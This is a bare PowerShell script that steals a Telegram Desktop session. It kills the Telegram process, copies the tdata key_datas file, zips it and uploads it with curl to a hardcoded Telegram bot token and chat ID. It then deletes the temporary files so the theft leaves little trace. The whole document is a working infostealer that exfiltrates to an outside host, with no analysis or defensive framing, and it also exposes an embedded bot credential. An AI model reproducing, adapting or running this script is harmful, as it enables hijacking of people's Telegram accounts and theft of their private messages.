taskkill /f /im Telegram.exe
$t = "$env:APPDATA\Telegram Desktop\tdata\key_datas"
if (!(Test-Path $t)) { exit }
$d = "$env:TMP\t"
New-Item $d -ItemType Directory -Force | Out-Null
Copy-Item $t $d -Force
$z = "$env:TMP\t.zip"
Compress-Archive "$d\*" $z -Force
Remove-Item $d -Recurse -Force
curl.exe -s -F "chat_id=8115479934" -F "document=@$z" "https://api.telegram.org/bot8896140664:AAG3GYY_qygOReI-JTOisou02Lfj3NdavQo/sendDocument"
Remove-Item $z -Force
exit
